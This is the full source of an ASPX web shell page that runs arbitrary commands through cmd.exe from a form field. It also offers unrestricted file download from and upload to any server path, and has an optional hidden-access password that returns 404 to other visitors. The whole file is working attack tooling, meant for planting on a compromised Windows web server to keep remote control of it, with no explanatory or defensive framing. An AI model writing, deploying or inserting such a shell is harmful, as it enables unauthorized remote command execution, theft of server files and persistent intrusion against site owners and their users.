<%@ Page Language="C#" Debug="true" ValidateRequest="false" %>
<%
    string stealthPassword = "";
    if(stealthPassword != "" && stealthPassword != Request.QueryString["pw"])
    {
        Response.StatusCode = 404;
        Response.End();
    }

    string downloadFile = Request.Form["downloadFile"];
    string downloadMsg = "";
    if(downloadFile != null)
    {
        byte[] buffer = new byte[8192];
        System.IO.FileStream fs = null;
        try
        {
            fs = new System.IO.FileStream(downloadFile, System.IO.FileMode.Open, System.IO.FileAccess.Read);
            Response.Clear();
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=" + System.IO.Path.GetFileName(downloadFile));
            Response.AddHeader("Content-Length", fs.Length.ToString());
            int readLen;
            while((readLen = fs.Read(buffer, 0, buffer.Length)) > 0)
                Response.OutputStream.Write(buffer, 0, readLen);
            Response.End();
        }
        catch(System.IO.FileNotFoundException e)
        {
            downloadMsg = "<code>FileNotFoundException</code> while accessing file <code>" + HttpUtility.HtmlEncode(downloadFile) + "</code><br>\n";
        }
        catch(System.UnauthorizedAccessException e)
        {
            downloadMsg = "<code>UnauthorizedAccessException</code> while accessing file <code>" + HttpUtility.HtmlEncode(downloadFile) + "</code><br>\n";
        }
        catch(System.IO.IOException e)
        {
            downloadMsg = "<code>IOException</code> while accessing file <code>" + HttpUtility.HtmlEncode(downloadFile) + "</code><br>\n";
        }
        finally
        {
            if(fs != null)
                fs.Close();
        }
    }

    HttpFileCollection uploadFiles = Request.Files;
    string uploadMsg = "";
    if(uploadFiles.Count > 0)
    {
        string uploadDir = Request.Form["uploadDir"];
        if(uploadDir == null || uploadDir == "")
            uploadDir = ".";
        uploadDir = System.IO.Path.GetFullPath(uploadDir);
        for(int i = 0; i < uploadFiles.Count; i++)
        {
            string dest = System.IO.Path.Combine(uploadDir, uploadFiles[i].FileName);
            try {
                uploadFiles[i].SaveAs(dest);
                uploadMsg += "Successfully uploaded <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br>\n";
            }
            catch(System.IO.DirectoryNotFoundException e)
            {
                uploadMsg += "<code>DirectoryNotFoundException</code> while saving file <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br>\n";
            }
            catch(System.UnauthorizedAccessException e)
            {
                uploadMsg += "<code>UnauthorizedAccessException</code> while saving file <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br>\n";
            }
            catch(System.IO.IOException e)
            {
                uploadMsg += "<code>IOException</code> while saving file <code>" + HttpUtility.HtmlEncode(uploadFiles[i].FileName) + "</code> to <code>" + HttpUtility.HtmlEncode(dest) + "</code><br>\n";
            }
        }
    }

    string cmd = Request.Form["cmd"];
    string fullCmd = "";
    StringBuilder output = new StringBuilder();
    Int32 exitCode = 0;
    if(cmd != null && cmd.Trim() != "")
    {
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        fullCmd = proc.StartInfo.FileName + " " + proc.StartInfo.Arguments;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.CreateNoWindow = true;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardError = true;
        System.Diagnostics.DataReceivedEventHandler handler = new System.Diagnostics.DataReceivedEventHandler(delegate(object sender, System.Diagnostics.DataReceivedEventArgs e) { output.Append(e.Data).Append(Environment.NewLine); });
        proc.OutputDataReceived += handler;
        proc.ErrorDataReceived += handler;
        proc.Start();
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();
        proc.WaitForExit();
        exitCode = proc.ExitCode;
    }
%>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>ASPX Webshell</title>
        <style>
            body {
                font-family: sans-serif;
            }
            input[type=text] {
                font-family: monospace;
            }
            .cmdBox {
                width: 80%;
            }
            .infoText {
                margin: 3px auto;
            }
            .featureBox {
                margin: 1rem auto;
            }
        </style>
    </head>
    <body>
        <form id="cmdForm" method="POST">
            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox">
            <input type="submit" value="Run">
        </form>
        <div class="infoText">
<%
    if(fullCmd != "")
    {
        Response.Write("Output of command: <code>" + HttpUtility.HtmlEncode(fullCmd) + "</code>");
    }
    else
    {
        Response.Write("Run a command to see its output");
    }
%>
        </div>
        <textarea readonly="readonly" rows="25" class="cmdBox">
<%= HttpUtility.HtmlEncode(output.ToString()) %>
        </textarea>
        <div class="infoText">
<%
    if(fullCmd != "")
    {
        Response.Write("Exit code: <code>" + exitCode + "</code>");
    }
%>
        </div>
        <div class="featureBox">
            <b>File Upload</b>
            <div>
<%= uploadMsg %>
            </div>
            <form method="POST" enctype="multipart/form-data">
                <input type="text" name="uploadDir" placeholder="Destination folder">
                <input type="file" name="uploadFiles[]" multiple="multiple">
                <input type="submit" value="Upload">
            </form>
        </div>
        <div class="featureBox">
            <b>File Download</b>
            <div>
<%= downloadMsg %>
            </div>
            <form method="POST">
                <input type="text" name="downloadFile" placeholder="File to download">
                <input type="submit" value="Download">
            </form>
        </div>
        <script>
            function saveHistory() {
                var cmd = document.getElementById("cmd").value;
                if(cmd.trim() != "" && cmd != shellHistory[shellHistory.length - 1]) {
                    shellHistory.push(cmd);
                }
                sessionStorage.setItem("shellHistory", JSON.stringify(shellHistory));
            }
            function cycleHistory(event) {
                var cmdInput = document.getElementById("cmd");
                if(event.code == "ArrowUp" && historyPos > 0) {
                    historyPos--;
                    cmdInput.value = shellHistory[historyPos];
                } else if(event.code == "ArrowDown" && historyPos < shellHistory.length) {
                    historyPos++;
                    if(historyPos < shellHistory.length) {
                        cmdInput.value = shellHistory[historyPos];
                    } else {
                        cmdInput.value = "";
                    }
                }
                if(event.code == "ArrowUp" || event.code == "ArrowDown") {
                    cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
                    event.preventDefault();
                }
            }
            var shellHistory = JSON.parse(sessionStorage.getItem("shellHistory"));
            if(shellHistory == null) {
                shellHistory = new Array();
            }
            var historyPos = shellHistory.length;
            document.getElementById("cmdForm").addEventListener("submit", saveHistory);
            document.getElementById("cmd").addEventListener("keydown", cycleHistory);
        </script>
    </body>
</html>
